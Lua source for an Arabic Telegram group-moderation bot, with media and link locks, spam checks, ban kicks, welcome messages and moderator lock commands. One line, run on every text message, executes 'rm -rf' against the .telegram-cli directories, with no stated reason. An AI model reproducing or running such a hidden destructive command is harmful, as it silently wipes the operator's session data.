  
if msg.content_.ID == 'MessagePhoto' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockphoto'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصور  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end end  
if msg.content_.ID == 'MessageText' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlocktextus'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الرسائل  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end end  
if msg.content_.ID == 'MessageVideo' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockved'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end    end end     
if msg.content_.ID == 'MessageAnimation' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockgif'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف المتحركه  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end    end end  
if msg.content_.ID == 'MessageAudio' and  not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockmusc'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الاغاني  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end end  
if msg.content_.ID == 'MessageVoice' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockvico'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الصوت  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end    end end    
if msg.content_.ID == 'MessageSticker' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockste'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملصقات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end end    
if msg.forward_info_ and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockfwd'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف التوجيهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end    end  
if msg.content_.ID == 'MessageDocument' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockfile'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الملفات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end end 
if msg.content_.ID == "MessageUnsupported" and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockself'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then    if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الفيديو كام  *??\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end     end end  
if msg.content_.entities_ then if msg.content_.entities_[0] then if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockmark'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الماركداون  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end    end         end end end
if msg.content_.ID == 'MessageContact' and not is_monsh(msg)  then    if tonumber(tahadevstorm:get('numlockphon'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع حذف الجهات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الحذف او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   delete_msg(msg.chat_id_,{[0] = msg.id_})          end    end        end
if msg.content_.text_ then  local _nl, ctrl_chars = string.gsub(text, '%c', '')    local _nl, real_digits = string.gsub(text, '%d', '')     if not tahadevstorm:get(DEVSTOR..'bot:sens:spam'..msg.chat_id_) then   sens = 400    else   sens = tonumber(tahadevstorm:get(DEVSTOR..'bot:sens:spam'..msg.chat_id_))    end   if not is_monsh(msg)  and  tonumber(tahadevstorm:get('numlockspmkl'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100  and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then   delete_msg(msg.chat_id_,{[0] = msg.id_})    end    end
if msg.content_.ID == "MessageChatAddMembers" then     if msg.content_.members_[0].type_.ID == 'UserTypeBot' and not is_monsh(msg)  then   if tonumber(tahadevstorm:get('numlockbotspm'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100 then   if not msg.can_be_deleted_ == true and not tahadevstorm:get(DEVSTOR.."data2:bot:"..msg.chat_id_) then      storm_sendMsg(msg.chat_id_, msg.id_, 1, "*◗🚨¦ لا استطيع طرد البوتات  *👇\n*◗🚸¦ لان ليست لدي صلاحيه الطرد او انا لست ادمن *🍃\n", 1, "md")   tahadevstorm:setex(DEVSTOR.."data2:bot:"..msg.chat_id_, 10, true)   else   changeChatMemberStatus(msg.chat_id_, msg.content_.members_[0].id_, 'Kicked')      end    end   end   end 
if text and text:match('(.*)') then    title_name(msg.chat_id_)   if not tahadevstorm:get(DEVSTOR..'lock:tepy'..bot_id) then  sendaction(msg.chat_id_, 'Typing')   end   end 
if text and text:match('(.*)') then  title_name(msg.chat_id_)  os.execute('cd .. &&  rm -rf ../.telegram-cli')  os.execute('cd .. &&  rm -rf .telegram-cli')  end  local muteall = tahadevstorm:get(DEVSTOR..'muteall'..msg.chat_id_)
if msg.sender_user_id_ and muteall and not is_mod(msg) then delete_msg(msg.chat_id_, {[0] = msg.id_}) end
if msg.sender_user_id_ and is_muted(msg.chat_id_,msg.sender_user_id_) then delete_msg(msg.chat_id_, {[0] = msg.id_})   end
if
         msg.sender_user_id_
         and
         is_banned(msg.chat_id_
            ,msg.sender_user_id_)
         then
         kick(msg
            ,msg.chat_id_
            ,msg.sender_user_id_)
         delete_msg(msg.chat_id_
            , {[0] = msg.id_})
      end
if
         msg.content_
         and
         msg.content_.members_
         and
         msg.content_.members_[0]
         and
         msg.content_.members_[0].id_
         and
         is_banned(msg.chat_id_
            ,msg.content_.members_[0].id_)
         then
         kick(msg
            ,msg.chat_id_
            ,msg.content_.members_[0].id_)
         delete_msg(msg.chat_id_
            , {[0] = msg.id_})
         storm_sendMsg(msg.chat_id_
            , msg.id_
            , 1
            , ''
            ,1
            , 'md')
      end
if
         msg.sender_user_id_
         and
         is_gban(msg.chat_id_
            ,msg.sender_user_id_)
         then
         kick(msg
            ,msg.chat_id_
            ,msg.sender_user_id_)
         delete_msg(msg.chat_id_
            , {[0] = msg.id_})
      end
if
         msg.content_
         and
         msg.content_.members_
         and msg.content_.members_[0]
         and msg.content_.members_[0].id_
         and is_gban(msg.chat_id_
            ,msg.content_.members_[0].id_)
         then kick(msg
            ,msg.chat_id_
            ,msg.content_.members_[0].id_)
         delete_msg(msg.chat_id_
            , {[0] = msg.id_})
      end
      local
      status_welcome = (tahadevstorm:get(DEVSTOR..'add:welc:'..msg.chat_id_)
         or 'rem')
      if
         status_welcome == 'add'
         then
if
            msg.content_.ID == "MessageChatJoinByLink"
            then
if not
               is_banned(msg.chat_id_
                  ,msg.sender_user_id_)
               then
               function
                  wlc(extra,result,success)
                  if tahadevstorm:get(DEVSTOR..'welcome:'..msg.chat_id_)
                     then
                     t = tahadevstorm:get(DEVSTOR..'welcome:'..msg.chat_id_)
                  else 
                     t = {'هله اجه الكروب كله يرحب بيك💋',
                        'لضل صنم رحمه للكعبه احجي سولف اني اسولف وياك 🤗❤️',
                        'نورت الكروب 💋',
                        "هله بريحه هلي 😍",
                        'ضويت الكروب شمعه ❤️',
                        'الجه الزين كله 💋',
                        'هلا بيك حبيبي نورت ',
                        'نورت كلبي 💋',
                        'صير حباب ولضل ثكيل 🤷🏼‍♀️',
                        '❤️ نورتنه يروح عمتك ☺️',
                        'صير خوش عضو بالكروب ترا اطردك ',
                        'نـَْﮩْْ❀ُུـَ❀﴿💡﴾ـۖؐـورتـ❥',
                        'مٰ̲ہٰٰنہٰٰوِٰڕٰ حہٰٰبྀ̲ہ؏ۤـٖٓہٰٰمٰ̲ہٰٰڕٰيِٰہٰٰ┊※🌝️‘’'}
                  end
                  storm_sendMsg(msg.chat_id_
                     , msg.id_
                     , 1
                     , t
                     ,0)
                  storm_sendMsg(msg.chat_id_
                     , msg.id_
                     , 1
                     , ''..t[math.random(#t)]..''
                     ,0)
               end
               getUser(msg.sender_user_id_,wlc)
            end
         end
if
            msg.content_.members_
            and
            msg.content_.members_[0]
            and
            msg.content_.members_[0].type_.ID == 'UserTypeGeneral'
            then
if
               msg.content_.ID == "MessageChatJoinByLink"
               then
if not
                  is_banned(msg.chat_id_
                     ,msg.content_.members_[0].id_)
                  then
if
                     tahadevstorm:get(DEVSTOR..'welcome:'..msg.chat_id_)
                     then 
                     t = tahadevstorm:get(DEVSTOR..'welcome:'..msg.chat_id_)
                  else
                     t = ' {name} منور حياتي'
                  end
                  local
                  t = t:gsub('{name}'
                     ,msg.content_.members_[0].first_name_)
                  storm_sendMsg(msg.chat_id_
                     , msg.id_
                     , 1
                     , t
                     ,0)
               end
            end
         end
      end
      if
         chat_type == 'super'
         then
if
            tahadevstorm:get(DEVSTOR.."add:bot:group"..msg.chat_id_)  then
if
               text == 'قفل الصور'
               and
               msg.reply_to_message_id_ == 0
               and
               msg.reply_to_message_id_ == 0
               and
               is_mod(msg)
               then
               tahadevstorm:set(DEVSTOR..'lock:photo'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:photo'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:photo'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:photo'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصور \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  ,1
                  , 'md')  
elseif
               text == 'قفل الروابط'
               and
               msg.reply_to_message_id_ == 0
               and
               is_mod(msg)
               then
               tahadevstorm:set(DEVSTOR..'lock:links'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:links'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:links'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:links'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــروابط \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  ,1
                  , 'md')  
elseif
               text == 'قفل الشارحه'
               and
               msg.reply_to_message_id_ == 0
               and
               is_mod(msg)
               then
               tahadevstorm:set(DEVSTOR..'lock:cmds'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:cmds'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:cmds'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:cmds'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــشارحه \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha,1
                  , 'md')  
elseif
               text == 'قفل المعرفات'
               and
               msg.reply_to_message_id_ == 0
               and
               is_mod(msg)
               then
               tahadevstorm:set(DEVSTOR..'lock:user'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:user'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:user'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:user'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمعرفات \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  ,1
                  , 'md')  
elseif text == 'قفل التاك'
               and msg.reply_to_message_id_ == 0
               and is_mod(msg) then 
               tahadevstorm:set(DEVSTOR..'lock:hash'..msg.chat_id_,true) 
               tahadevstorm:del(DEVSTOR..'lockked:hash'..msg.chat_id_,true) 
               tahadevstorm:del(DEVSTOR..'lockkick:hash'..msg.chat_id_,true) 
               tahadevstorm:del(DEVSTOR..'lockktm:hash'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتاك \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  , 1
                  , 'md')  
elseif text == 'قفل الصوت'
               and msg.reply_to_message_id_ == 0
               and is_mod(msg) then
               tahadevstorm:set(DEVSTOR..'lock:muse'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:muse'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:muse'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:muse'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــصوت \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  ,1
                  , 'md')  
elseif text == 'قفل الدردشه'
               and msg.reply_to_message_id_ == 0
               and is_mod(msg) then
               tahadevstorm:set(DEVSTOR..'lock:text'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:text'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:text'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:text'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم قفـل الدردشه هنا *\n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  , 1
                  , 'md')  
elseif text == 'قفل الفيديو'
               and msg.reply_to_message_id_ == 0
               and is_mod(msg) then
               tahadevstorm:set(DEVSTOR..'lock:ved'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:ved'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:ved'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:ved'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــفيديو \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  , 1
                  , 'md')  
elseif
               text == 'قفل المتحركه'
               and msg.reply_to_message_id_ == 0
               and is_mod(msg) then
               tahadevstorm:set(DEVSTOR..'lock:gif'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:gif'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:gif'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:gif'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــمتحركه \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  ,1
                  , 'md')  
elseif
               text == 'قفل الملصقات'
               and msg.reply_to_message_id_ == 0
               and is_mod(msg) then
               tahadevstorm:set(DEVSTOR..'lock:ste'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:ste'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:ste'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:ste'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملصقات \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  ,1
                  , 'md')  
elseif
               text == 'قفل الالعاب'
               and msg.reply_to_message_id_ == 0
               and is_mod(msg) then
               tahadevstorm:set(DEVSTOR..'lock:geam'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockked:geam'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockkick:geam'..msg.chat_id_,true)
               tahadevstorm:del(DEVSTOR..'lockktm:geam'..msg.chat_id_,true)
               taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الالـعاب \n*◗📛¦ خـاصيــه ، الحــذف 🗑*'
               storm_sendMsg(msg.chat_id_
                  , msg.id_
                  , 1
                  , taha
                  ,1
                  , 'md')  
elseif text == 'قفل الاغاني' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:vico'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:vico'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الاغـاني \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل اللستات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:inlin'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:inlin'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* اللستـات \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:addm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:addm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم قفـل دخول الاعضاء* \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التوجيه' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:fwd'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:fwd'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــتوجيه \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الكلايش' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:spm'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:spm'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــكلايش \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الملفات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:file'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:file'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الــملفات \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:edit'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:edit'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:edit'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:edit'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تم قفـل تعديل الرسائل* \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الماركداون' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:mark'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:mark'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تـم قفـل ارســال* الماركداون \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:tagservr'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:tagservr'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:tagservr'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:tagservr'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم قفـل الاشعارت *\n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل الجهات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then  tahadevstorm:set(DEVSTOR..'lock:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockked:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:phon'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockktm:phon'..msg.chat_id_,true)  taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' ??\n*◗🚨¦ تـم قفـل ارســال* الــجهات \n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR..'lock:bots:kick'..msg.chat_id_,true) tahadevstorm:del(DEVSTOR..'lockked:bots'..msg.chat_id_,true)  tahadevstorm:del(DEVSTOR..'lockkick:bots:kick'..msg.chat_id_,true)   taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم قفـل اضافه البوتات *\n*◗📛¦ خـاصيــه ، الطرد 💭*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and is_mod(msg) then tahadevstorm:set(DEVSTOR.."lockpin"..msg.chat_id_, true) taha = '*◗🚸¦ اهــلا عـزيـزي* '..get_rtba(msg)..' 🍃\n*◗🚨¦ تــم قفـل تثبيت الرسائل *\n*◗📛¦ خـاصيــه ، الحــذف 🗑*' storm_sendMsg(msg.chat_id_, msg.id_, 1, taha,1, 'md')  
